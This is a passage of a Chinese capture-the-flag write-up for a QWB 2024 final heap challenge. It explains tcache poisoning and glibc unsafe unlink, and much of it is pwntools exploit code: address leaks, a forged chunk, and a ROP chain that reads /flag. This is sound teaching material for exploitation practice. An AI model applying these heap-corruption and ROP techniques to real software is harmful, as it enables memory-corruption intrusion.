class="number">2</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1233</span></span><br><span class="line">success(<span class="string">&#x27;code_base: &#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">6</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p8(<span class="number">0xa0</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure><p>成功将 Key 写为 0</p><img src="/2024/12/08/qwb2024_final/11.png" class=""><p>之后尝试泄露一下 heap 的地址，因为需要构造 unsorted bin，需要堆重叠修改 size，因此这里泄露堆地址是比较方便的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">16</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line">heap_addr=u64(res[<span class="number">8</span>:])-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr: &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>也很简单，free 一个块让它带地址直接 show 即可，但是会用 Key 解密之后输出，因此我们想要得到原堆块的地址就需要对结果进行加密，密钥已知，也是很容易得出的。</p><img src="/2024/12/08/qwb2024_final/12.png" class=""><p>紧接着再来一个 tcache bin attack，构造堆重叠，修改堆块的大小，free 掉，得到 unsorted bin，泄露得 libc 的地址（同时后面也是知道，我都unsafe unlink了，我还泄露libc地址干嘛呢？？）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,decrypt(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x431</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>)[:<span class="number">48</span>])</span><br><span class="line">add(<span class="number">14</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x350</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">32</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line"><span class="comment">#print(res.hex())</span></span><br><span class="line">libc_addr=u64(res[<span class="number">8</span>*<span class="number">3</span>:<span class="number">8</span>*<span class="number">4</span>])-<span class="number">0x215be0</span>+<span class="number">0x029000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这里我用了 14 这个下标是因为这个地方的指针比较重要（做到后面才发现的）。</p><p>此刻，便是良机，构造 unsafe unlink。</p><h4 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h4><p>讲解一下 unsafe unlink 的原理，glibc 除了 tcache bin 和 fastbin 是单链表管理之外，其余都是双链表管理，单链表管理的堆块普遍不参与相邻内存合并（consolidate）的操作。</p><p>而合并操作需要涉及解链（unlink），为什么需要解链才能合并。因为合并后得到是一个新的大小的堆块，不管是 small bin 还是 largebin，对大小都有严格的限制，所以合并必须 unlink。</p><p>解链我们找找 glibc 中的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到解链的一个重要操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><p>如果对应的堆块本身不处于被释放状态，意味着这个堆块的fd和bk指针我可以任意的修改。而合并是通过什么样的检测去判断呢，它有向前和向后两种合并的方式，从 glibc 源码中也不难看出，当 free 的一个块不在 fastbin 大小的范围内，便会尝试向前和向后合并。</p><p>向后合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向前合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">    size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>可以发现，向后合并（向较小地址）主要依赖于当前释放的这个堆块的 prev_inuse 位，如果为0证明前面（较小地址）的堆块被释放了，就要向后合并，而一旦这个位为0，则检查 prev_size 字段判断堆块的大小。</p><p>同时再来看看如果没有任何检查的 unsafe unlink 会发生什么。</p><p>由于 fd 和 bk 是我任意控制的，因此我可以将 fd+0x18 的地址写上 bk 值，将 bk+0x10 的地址写上 fd 的值。但是很不幸的，它检查了 <code>p-&gt;fd-&gt;bk==p &amp;&amp; p-&gt;bk-&gt;fd==p</code>，满足这些条件才能 unlink，本意很简单，一个正常的双向链表中，任意一个链表中的元素的后一个块的前一个块肯定是自己，反之同理，如果不满足则双向链表肯定发生了问题。</p><p>当然这个 check 可以绕过，首先需要一个指向 chunk 头部的指针，因此这需要我们伪造一个 chunk，而chunk头部的指针当然就是可以用分配得到的用户指针，它存放在程序代码的 bss 段中。</p><p>把 check 的条件化简一下，因为 <code>p-&gt;fd</code> 和 <code>p-&gt;bk</code> 都是任意值，因此不妨将它设为 x 和 y，那么就变成了 <code>x-&gt;bk==p &amp;&amp; y-&gt;fd==p</code>，而 <code>x-&gt;fd</code> 与 <code>y-&gt;bk</code> 转为指针的写法就是 <code>*(void **)(x+0x18)=p&amp;&amp;*(void **)(y+0x10)=p</code>，取第一个等式，对等号两边同时取地址得到 <code>(x+0x10)=&amp;p</code> 那么 <code>x=&amp;p-0x18</code> 同理 <code>y=&amp;p-0x10</code>。那么绕过这个检查的主要就是需要找到一个指向头部的指针。</p><hr><p>在上面的基础，用下面的代码，我们来观察 unsafe unlink 的图解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,decrypt(<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x20</span>))</span><br><span class="line">book=code_base+<span class="number">0x4080</span> </span><br><span class="line">edit(<span class="number">3</span>,decrypt(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x18</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>))<span class="comment">#+p64(0x30)+p64(0xc0)))</span></span><br><span class="line">edit(<span class="number">14</span>,decrypt(p64(<span class="number">0x30</span>)+p64(<span class="number">0xc0</span>)))</span><br><span class="line">free(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>结果如下</p><img src="/2024/12/08/qwb2024_final/13.png" class=""><p>在这里，我分配了一个0x40的堆块，返回了 <code>0x55555555c350</code> 这个指针，通过堆重叠，在 0x40 的堆块里面包含了一个 0x30 的堆块，可以发现 0x40 指向分配给用户的指针指向了 0x30 这个堆块的头部，这是我们伪造的一个 fake chunk，这里其实不需要加 0x31 这个size，因为 unlink不检查这个size，这里写 0x31 主要是方便理解。</p><p>同时它的 fd 和 bk，分别赋值了 <code>0x0000555555558080</code> 和 <code>0x0000555555558088</code>，这个值其实就是因为我们伪造的堆块得到了一个指向头部的指针在 BookList 全局数组当中，因此上面的等式中的 &amp;p 就有了，不难发现 <code>&amp;p = 0x555555558090</code>，那么根据前面的 x 和 y 相关方程可得 <code>x=0x0000555555558080</code>，<code>y=0x0000555555558088</code>，分别对应了这里的 fd 和 bk 的位置。</p><p>最后需要伪造 prevsize 为 0x30 和将 size 的prev_inuse设置为0，才能够成功触发 unsafe unlink。</p><p>触发了 unsafe unlink 之后，可以发现，BookList[3] 得到了一个指向自身 - 0x18 的位置，同时合并堆块的操作也是成功的，这里大小为 0x421 是因为后面还有 free 块，向前也合并了。</p><img src="/2024/12/08/qwb2024_final/14.png" class=""><p>有了这个指针，可以任意修改 BookList[0]的值，再通过 BookList[0] 指针取读写任意的地址。此刻，malloc 已经不被需要了，我已然是无敌的状态。</p><p>这里选择劫持通过 <code>__environ</code> 泄露栈，用栈迁移劫持栈到堆上，在堆上提前布置好 ROP 链进行 ORW 即可。</p><p>想必也是可以一气呵成了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">3</span>,decrypt(p64(code_base+<span class="number">0x4100</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])))</span><br><span class="line"><span class="comment">#edit(0,decrypt(p32(0x10)*4))</span></span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">res=encrypt(p.recv(<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(res.<span class="built_in">hex</span>())</span><br><span class="line">stack=u64(res[:<span class="number">8</span>])-<span class="number">0x138</span></span><br><span class="line">success(<span class="string">&#x27;stack: &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(4,decrypt(b&#x27;a&#x27;*0x20))</span></span><br><span class="line">leave=code_base+<span class="number">0x1AA4</span></span><br><span class="line">pop_rdi=libc_addr+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi=libc_addr+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret_10=libc_addr+<span class="number">0x00000000000dfc12</span></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0xa0</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#add(4,decrypt(p64(pop_rdi)))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x4350</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x360</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(heap_addr+<span class="number">0x4350</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;open&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x390</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3c0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>+<span class="number">0x30</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(stack))</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x555555555aa4&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x358</span>)+p64(leave)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>至此，已成艺术</p><img src="/2024/12/08/qwb2024_final/15.png" class=""><h3 id="最终-EXP"><a href="#最终-EXP" class="headerlink" title="最终 EXP"></a>最终 EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./heap&#x27;</span>,aslr=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;47.94.85.95&#x27;,28760)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/xia0ji233/pwn/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\nP&#x27;</span>)[-<span class="number">8</span>:-<span class="number">2</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1233</span></span><br><span class="line">success(<span class="string">&#x27;code_base: &#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">6</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p8(<span class="number">0xa0</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">16</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line">heap_addr=u64(res[<span class="number">8</span>:])-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr: &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,decrypt(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x431</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>)[:<span class="number">48</span>])</span><br><span class="line">add(<span class="number">14</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x350</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">32</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line"><span class="comment">#print(res.hex())</span></span><br><span class="line">libc_addr=u64(res[<span class="number">8</span>*<span class="number">3</span>:<span class="number">8</span>*<span class="number">4</span>])-<span class="number">0x215be0</span>+<span class="number">0x029000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span 